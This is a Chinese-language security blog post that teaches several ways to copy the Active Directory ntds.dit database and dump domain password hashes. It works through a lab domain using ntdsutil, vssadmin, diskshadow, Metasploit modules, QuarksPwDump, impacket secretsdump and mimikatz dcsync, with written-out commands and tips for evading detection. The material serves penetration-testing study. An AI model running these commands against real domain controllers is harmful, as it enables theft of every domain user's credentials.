@@ -1,0 +1,668 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <meta name="theme-color" content="#3367D6"/>
+  <link rel="apple-touch-icon" href="/icons-192.png">
+  <link rel="manifest" href="/manifest.json">
+  
+  <meta name="generator" content="Hexo 5.4.2">
+
+  
+    <meta name="description" content="No matter how far you may fly, never forget where you come from.">
+  
+
+  
+
+  
+    <meta name="author" content="WsyKer">
+  
+
+  
+
+  
+
+  <title>ntds.dit导出 | WsyKer&#39;s Blog</title>
+
+  
+
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@1.1.3/index.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlightjs@9.16.2/styles/monokai.css">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body>
+  <div class="root-container">
+    
+<!-- header container -->
+<header class="header-container post">
+  
+    <div class="post-image" style="background-image: url(https://wsyker.oss-cn-beijing.aliyuncs.com/img/blog/title.jpg)"></div>
+  
+
+  <!-- navbar -->
+<nav class="navbar">
+  <div class="navbar-content">
+    <!-- logo -->
+    <div class="navbar-logo">
+      <a href="/">
+        
+          WsyKer&#39;s Blog
+        
+      </a>
+    </div>
+    <!-- link -->
+    <div class="navbar-link">
+      <div class="navbar-btn">
+        <div></div>
+        <div></div>
+        <div></div>
+      </div>
+      <ul class="navbar-list">
+        
+          <li class="navbar-list-item"><a href="/">首页</a></li>
+        
+          <li class="navbar-list-item"><a href="/links">友链</a></li>
+        
+          <li class="navbar-list-item"><a href="/about">关于</a></li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+  
+    <div class="header-content">
+      <div class="post-text layout-block">
+        <div class="layout-margin">
+          <h1 class="title-wrap">ntds.dit导出</h1>
+          <h2 class="title-sub-wrap">
+            <strong>WsyKer</strong>
+            <span>发布于</span>
+            <time  class="article-date" datetime="2022-06-23T15:28:25.000Z" itemprop="datePublished">2022-06-23</time>
+          </h2>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">📒 内网安全</a></li>
+  
+</ul>
+          <ul class="wrap-list dark">
+  
+    <li><a href="/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">🏷️ 内网安全</a></li>
+  
+</ul>
+        </div>
+      </div>
+    </div>
+  
+
+  
+  
+  
+</header>
+
+    <!-- 文章 -->
+
+<!-- 文章内容 -->
+<div class="body-container">
+  <article class="content-container layout-block post-container">
+    <div class="article-info">
+      
+      
+      
+      
+      <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
+        <h1 id="一、介绍"><a href="#一、介绍" class="headerlink" title="一、介绍"></a>一、介绍</h1><p>Ntds.dit(也被称为Active Directory database)包含了当前域用户中所有的用户的账号信息，和其HASH值，默认路径为：C:\Windows\NTDS，且只能通过域控制器进程和协议访问。</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/1.png" alt="1"></p>
+<p>直接复制是复制不出来的，会提示文件已在Encrypting File System(EFS)中打开</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/2.png" alt="2"></p>
+<h1 id="二、Ntdsutil工具提取"><a href="#二、Ntdsutil工具提取" class="headerlink" title="二、Ntdsutil工具提取"></a>二、Ntdsutil工具提取</h1><ul>
+<li>Ntdsutil介绍：</li>
+</ul>
+<p>ntdsutil.exe是一个Active Directory提供管理设施的命令行工具。可使用ntdsutil.exe执行Active Directory的数据库维护，管理和控制单个主机操作，创建应用程序目录分区，以及删除由未使用Active Directory安装向导（DCPromp.exe）成功降级的域控制器留下的元数据，该工具默认被安装在域控制器上，我们可以在域控制器上进行操作，也可以通过域内机器远程在域控制器上操作</p>
+<p>支持的操作系统：Server 2003、Server 2008、Server 2012</p>
+<ul>
+<li>创建快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/3.png" alt="3"></p>
+<ul>
+<li>查看快照是否创建成功：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/4.png" alt="4"></p>
+<ul>
+<li>挂载快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/5.png" alt="5"></p>
+<ul>
+<li>拷贝快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy C:\$SNAP_202202281107_VOLUMEC$\windows\ntds\ntds.dit c:\windows\temp\ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/6.png" alt="6"></p>
+<ul>
+<li>复制文件：</li>
+</ul>
+<p>这样子就可以把ntds文件复制出来了</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/7.png" alt="7"></p>
+<ul>
+<li>卸载并删除快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;unmount &#123;GUID&#125;&quot; &quot;delete &#123;GUID&#125;&quot; quit quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/8.png" alt="8"></p>
+<h1 id="三、vssadmin工具提取"><a href="#三、vssadmin工具提取" class="headerlink" title="三、vssadmin工具提取"></a>三、vssadmin工具提取</h1><ul>
+<li>vssadmin介绍：</li>
+</ul>
+<p>vssadmin1是Windows Server 2008及Windows 7系统提供的VSS管理工具，它可以用于创建或删除卷影副本，列出卷影副本的信息（只能管理系统Provider创建的卷影副本）。还可以用于显示所有安装的所有卷影副本写入程序（writers）和提供程序（providers），以及改变卷影副本存储空间（即所谓的“diff空间”）的大小等。支持的操作系统：Server 2008、Server 2012</p>
+<ul>
+<li>创建快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/9.png" alt="9"></p>
+<ul>
+<li>复制文件：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/10.png" alt="10"></p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/11.png" alt="11"></p>
+<ul>
+<li>删除快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/12.png" alt="12"></p>
+<h1 id="四、vssown-vbs"><a href="#四、vssown-vbs" class="headerlink" title="四、vssown.vbs"></a>四、vssown.vbs</h1><ul>
+<li>vssown介绍：</li>
+</ul>
+<p>vssown.vbs和vssadmin类似，它是由Tim Tomes开发完成的，它可以创建和删除卷影副本，以及启动和停止卷影复制服务。下载地址：<a target="_blank" rel="noopener" href="https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs">https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs</a></p>
+<ul>
+<li>启动卷影复制服务：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /start</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/13.png" alt="13"></p>
+<ul>
+<li>创建一个C盘的卷影副本：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /create c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/14.png" alt="14"></p>
+<ul>
+<li>列出当前卷影副本：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /list</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/15.png" alt="15"></p>
+<ul>
+<li>复制文件：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/16.png" alt="16"></p>
+<ul>
+<li>删除卷影副本：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /delete &#123;ID&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/17.png" alt="17"></p>
+<h1 id="五、NTDSUTIL的IFM"><a href="#五、NTDSUTIL的IFM" class="headerlink" title="五、NTDSUTIL的IFM"></a>五、NTDSUTIL的IFM</h1><p>将ntds.dit复制到C盘下的test文件夹中的Active Directory文件夹中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:/test&quot; q q</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/18.png" alt="18"></p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/19.png" alt="19"></p>
+<h1 id="六、Nishang"><a href="#六、Nishang" class="headerlink" title="六、Nishang"></a>六、Nishang</h1><ul>
+<li>Nishang介绍：</li>
+</ul>
+<p>Nishang 是一个框架和脚本和有效负载的集合，它支持使用 PowerShell 进行攻击性安全、渗透测试和红队。 Nishang 在渗透测试的所有阶段都很有用。 其中Copy-VSS.ps1脚本，可以有效的下载地址：<a target="_blank" rel="noopener" href="https://github.com/samratashok/nishang">https://github.com/samratashok/nishang</a></p>
+<ul>
+<li>导入Copy-VSS.ps1：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\Copy-VSS.ps1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/20.png" alt="20"></p>
+<ul>
+<li>执行命令：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Copy-vss</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/21.png" alt="21"></p>
+<h1 id="七、vshadow"><a href="#七、vshadow" class="headerlink" title="七、vshadow"></a>七、vshadow</h1><ul>
+<li>vshadow介绍：</li>
+</ul>
+<p>vshadow是一个简单的指令行工具，它允许任何人创建卷影拷贝。因为是微软自带的，所以可以有效的Bypass防火墙。  下载地址：<a target="_blank" rel="noopener" href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p>
+<ul>
+<li>vshadow创建快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe -p -nw C:</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/22.png" alt="22"></p>
+<ul>
+<li>vshadow查看快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe -q</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/23.png" alt="23"></p>
+<ul>
+<li>复制文件：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/24.png" alt="24"></p>
+<ul>
+<li>vshadow删除快照：</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vshadow.exe -da</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/25.png" alt="25"></p>
+<h1 id="八、diskshadow"><a href="#八、diskshadow" class="headerlink" title="八、diskshadow"></a>八、diskshadow</h1><ul>
+<li>diskshadow介绍：</li>
+</ul>
+<p>DiskShadow.exe这款工具可以使用卷影拷贝服务（VSS）所提供的多个功能。默认配置下DiskShadow.exe使用了一种交互式命令解释器，这里跟DiskRaid或DiskPart比较类似。事实上，因为DiskShadow的代码是由微软官方签名的，而且在Windows Server 2008、Windows Server 2012和Windows Server 2016中默认包含了DiskShadow。DiskShadow.exe也是可以用来操作VSS导出ntds.dit，其功能上类似vshadow。它同样是被放在了c:\windows\system32目录中，而vshadow则是被包含在windowsSDK中，实战中可能还需要想办法传到目标机器上，也就是说，diskshadow在我们实际渗透过程中更便于在目标系统上使用。diskshadow拥有交互模式和非交互模式两种，交互模式需要登录远程桌面等图形化管理方法，不利于隐蔽的进行渗透，所以我们一般使用非交互模式进行操作。因为不论是交互模式还是非交互模式都可以使用EXEC通过调取一个脚本文件执行相关命令</p>
+<ul>
+<li>diskshadow基础用法：</li>
+</ul>
+<p>先写一个执行计算机的命令保存到c盘</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo exec C:\Windows\System32\calc.exe &gt; c:\command.txt</span><br></pre></td></tr></table></figure>
+
+<p>然后使用diskshadow执行即可打开计算机，使用此方法还可以绕过很多waf，比如powershell无文件落地，因为diskshadow自带微软官方签名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diskshadow.exe /s c:\command.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/26.png" alt="26"></p>
+<ul>
+<li>diskshadow提取ntds.dit：</li>
+</ul>
+<p>把以下代码保存到txt并执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters</span><br><span class="line">add volume c: alias someAlias</span><br><span class="line">create</span><br><span class="line">expose %someAlias% k:</span><br><span class="line">exec “cmd.exe” /c copy K:\Windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line">delete shadows all</span><br><span class="line">list shadows all</span><br><span class="line">reset</span><br><span class="line">exit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/27.png" alt="27"></p>
+<p>可以看到多出来了一个盘，这个盘的windows\NTDS\文件夹是可以复制出来的</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/28.png" alt="28"></p>
+<h1 id="九、使用Metasploit获取域散列"><a href="#九、使用Metasploit获取域散列" class="headerlink" title="九、使用Metasploit获取域散列"></a>九、使用Metasploit获取域散列</h1><p>msf中可能用到的模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">post/windows/gather/ntds_location		该模块可查看ntds路径</span><br><span class="line">post/windows/gather/smart_hashdump	在线导出域账号hash（建议在2012以上使用）</span><br><span class="line">auxiliary/admin/smb/psexec_ntdsgrad	利用域管账号，导出ntds必要文件到本地</span><br><span class="line">post/windows/gather/ntds_grabber		利用powershell将ntds必要文件下载到本地后导出</span><br><span class="line">post/windows/gather/credentials/domain_hashdump	介绍其方法</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>模块：post&#x2F;windows&#x2F;gather&#x2F;ntds_location</li>
+</ul>
+<p>		</p>
+<p>该模块可查看ntds路径，首先获取一个域控的shell</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/29.png" alt="29"></p>
+<p>获取shell之后，使用模块进行查找路径：</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ntds</span><br><span class="line">msf6 &gt; use post/windows/gather/ntds_location</span><br><span class="line">msf6 post(windows/gather/ntds_location) &gt; set SESSION <span class="number">1</span></span><br><span class="line">msf6 post(windows/gather/ntds_location) &gt; <span class="keyword">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/30.png" alt="30"></p>
+<ul>
+<li>模块：post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</li>
+</ul>
+<p>在线导出域账号hash（建议在2012以上使用）</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search smart_hash</span><br><span class="line">msf6 &gt; use post/windows/gather/smart_hashdump</span><br><span class="line">msf6 post(windows/gather/smart_hashdump) &gt; set SESSION <span class="number">1</span></span><br><span class="line">msf6 post(windows/gather/smart_hashdump) &gt; <span class="keyword">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/31.png" alt="31"></p>
+<ul>
+<li>模块：auxiliary&#x2F;admin&#x2F;smb&#x2F;psexec_ntdsgrad</li>
+</ul>
+<p>利用域管账号，导出ntds必要文件到本地</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ntds</span><br><span class="line">msf6 &gt; use auxiliary/admin/smb/psexec_ntdsgrab</span><br><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; set RHOSTS <span class="number">172.16</span>.<span class="number">1.169</span></span><br><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; set SMBDomain 域名</span><br><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; set SMBUser 用户名</span><br><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; set SMBPass 密码</span><br><span class="line">msf6 auxiliary(admin/smb/psexec_ntdsgrab) &gt; <span class="keyword">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/32.png" alt="32"></p>
+<ul>
+<li>模块：post&#x2F;windows&#x2F;gather&#x2F;ntds_grabber</li>
+</ul>
+<p>利用powershell将ntds必要文件下载到本地后导出</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search ntds_grabber</span><br><span class="line">msf6 &gt; use post/windows/gather/ntds_grabber</span><br><span class="line">msf6 post(windows/gather/smart_hashdump) &gt; set SESSION <span class="number">1</span></span><br><span class="line">msf6 post(windows/gather/smart_hashdump) &gt; <span class="keyword">run</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/33.png" alt="33"></p>
+<h1 id="十、QuarksPwDump导出域账号域散列值"><a href="#十、QuarksPwDump导出域账号域散列值" class="headerlink" title="十、QuarksPwDump导出域账号域散列值"></a>十、QuarksPwDump导出域账号域散列值</h1><ul>
+<li>QuarksPwDump介绍：</li>
+</ul>
+<p>QuarksPwDump是一款开放源代码的Windows用户凭据提取工具，它可以抓取windows平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和Bitlocker等等。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/tuthimi/quarkspwdump/">https://github.com/tuthimi/quarkspwdump/</a></p>
+<ul>
+<li>从注册表抓取System：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="keyword">save</span> hklm\<span class="keyword">system</span> <span class="keyword">system</span>.hive</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/34.png" alt="34"></p>
+<ul>
+<li>修复ntds.dit：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esentutl /p /o ntds.dit</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>QuarksPwDump导出域用户hash到log.txt：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QuarksPwDump.exe -dhd -sf <span class="keyword">system</span>.hive -nt ntds.dit -o <span class="keyword">log</span>.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/35.png" alt="35"></p>
+<h1 id="十一、使用esedbexport恢复ntds-dit"><a href="#十一、使用esedbexport恢复ntds-dit" class="headerlink" title="十一、使用esedbexport恢复ntds.dit"></a>十一、使用esedbexport恢复ntds.dit</h1><ul>
+<li>安装依赖：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-<span class="keyword">get</span> install autoconf automake autopoint libtool pkg-config</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/36.png" alt="36"></p>
+<ul>
+<li>安装libesedb：</li>
+</ul>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://github.com/libyal/libesedb">https://github.com/libyal/libesedb</a></p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/37.png" alt="37"></p>
+<p>进行安装</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.<span class="keyword">com</span>/libyal/libesedb/releases/download/<span class="number">20200418</span>/libesedb-experimental-<span class="number">20200418</span>.tar.gz</span><br><span class="line">tar zvxf libesedb-experimental-<span class="number">20200418</span>.tar.gz</span><br><span class="line">./configure</span><br><span class="line">sudo make &amp;&amp; make install &amp;&amp; ldconfig</span><br><span class="line">sudo ldconfig</span><br><span class="line">esedbtools/esedbexport</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/38.png" alt="38"></p>
+<ul>
+<li>使用libesedb提取信息：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">esedbexport -m tables ntds.dit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/39.png" alt="39"></p>
+<p>提取完了后会出现一个文件夹，里面存放了很多个表</p>
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/40.png" alt="40"></p>
+<ul>
+<li>安装ntdsxtract：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.<span class="keyword">com</span>/csababarta/ntdsxtract.git</span><br><span class="line">cd ntdsxtract/</span><br><span class="line">python setup.py build &amp;&amp; python setup.py install</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/41.png" alt="41"></p>
+<p>安装完成后将提取出的tds.dit.export文件夹中的datatable.3和link_table.5文件，以及System文件一起放入ntdsxtract文件夹，system文件位置在</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\config</span><br></pre></td></tr></table></figure>
+
+<p>如果复制不出来可以使用diskshadow，或者从注册表中导出</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg <span class="keyword">save</span> hklm\<span class="keyword">system</span> <span class="keyword">system</span>.hive</span><br></pre></td></tr></table></figure>
+
+<p>然后使用以下命令将域内的所有用户及散列值导出到result.txt文件中</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python dsusers.py datatable.<span class="number">3</span> link_table.<span class="number">5</span> output --syshive <span class="keyword">system</span>.hive --passwordhashes --pwdformat ocl --ntoutfile ntout --lmoutfile lmout | tee result.txt</span><br></pre></td></tr></table></figure>
+
+<h1 id="十二、使用impacket导出Hash"><a href="#十二、使用impacket导出Hash" class="headerlink" title="十二、使用impacket导出Hash"></a>十二、使用impacket导出Hash</h1><ul>
+<li>介绍：</li>
+</ul>
+<p>Impacket是用于处理网络协议的Python类的集合。Impacket专注于提供对数据包的低级编程访问，对于某些协议（如SMB1-3和MSRPC），提供协议实现本身。数据包可以从零开始构造，也可以从原始数据解析，而面向对象的API使使用深层协议层次结构变得简单。</p>
+<ul>
+<li>下载：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.<span class="keyword">com</span>/SecureAuthCorp/impacket.git</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>导出Hash：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">impacket-secretsdump -<span class="keyword">system</span> <span class="keyword">SYSTEM</span> -ntds ntds.dit LOCAL</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/42.png" alt="42"></p>
+<h1 id="十三、利用Dcsync获取域用户Hash"><a href="#十三、利用Dcsync获取域用户Hash" class="headerlink" title="十三、利用Dcsync获取域用户Hash"></a>十三、利用Dcsync获取域用户Hash</h1><ul>
+<li>介绍：</li>
+</ul>
+<p>Mimikatz有一个名为dcsync的功能，它利用目录复制服务直接读取ntds.dit文件检索哈希值，但是必须使用域管理员权限运行mimikatz才可以读取ntds.dit</p>
+<ul>
+<li>使用方法：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:god.org /all /csv</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/43.png" alt="43"></p>
+<ul>
+<li>指定某个用户：</li>
+</ul>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:god.org /all /user:Administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://wsyker.oss-cn-beijing.aliyuncs.com/img/ntds/44.png" alt="44"></p>
+
+      </section>
+
+      
+      
+        <nav class="article-nav">
+          
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
